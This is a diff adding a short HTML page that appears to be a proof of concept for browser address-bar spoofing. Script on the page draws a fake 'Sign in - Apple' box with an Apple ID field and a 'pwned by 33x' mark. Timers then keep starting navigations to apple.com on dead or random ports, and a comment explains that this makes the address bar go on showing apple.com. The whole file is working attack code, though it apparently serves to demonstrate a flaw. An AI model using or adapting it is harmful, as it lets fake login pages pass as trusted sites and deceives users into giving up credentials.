@@ -1,0 +1,9 @@
+<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>.</title>
+<style>body{font-family:-apple-system,system-ui,sans-serif;margin:0}.wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}.mark{color:#c00;font-weight:700;font-size:20px}</style></head>
+<body>
+<script>
+document.write('<div class="wrap"><h1>Sign in - Apple</h1><input placeholder="Apple ID" style="padding:12px;border:1px solid #ccc;border-radius:8px"><div class="mark">pwned by 33x</div></div>');
+var V='https://www.apple.com';
+setTimeout(function(){ location.href = V + ':8081/'; }, 400);          // dead port -> never commits -> bar holds apple.com
+setInterval(function(){ location.href = V + ':' + (8000+Math.floor(Math.random()*900)) + '/'; }, 2000); // re-pin
+</script></body></html>
